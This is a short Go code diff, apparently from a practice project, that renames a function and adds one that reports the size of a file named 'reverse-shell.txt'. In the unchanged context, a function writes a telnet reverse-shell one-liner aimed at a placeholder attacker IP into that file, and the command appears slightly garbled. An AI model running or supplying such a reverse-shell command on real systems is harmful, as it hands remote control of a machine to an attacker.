@@ -148,7 +148,7 @@ type Room struct {
 
 // a pointer is a variable that stores the location of a value in memory used especially in linked list
 
-func filer() {
+func checkIfFileExist() {
 
 	x := House{
 		NoRooms: 1,
@@ -193,4 +193,12 @@ func writeToFile() {
 
 	file.Write([]byte("\n\nfor telnet:\nrm -f /tmp/p; mknod /tmp/p p && telnet ATTACKING-IP 80 0/tmp/p\n"))
 	fmt.Println("Data succesfully written to file")
+}
+
+func checkFileSize() {
+	file, err := os.Stat("reverse-shell.txt")
+	if err != nil {
+		log.Fatal(err)
+	}
+	fmt.Printf("specified file is %dbytes", file.Size())
 }
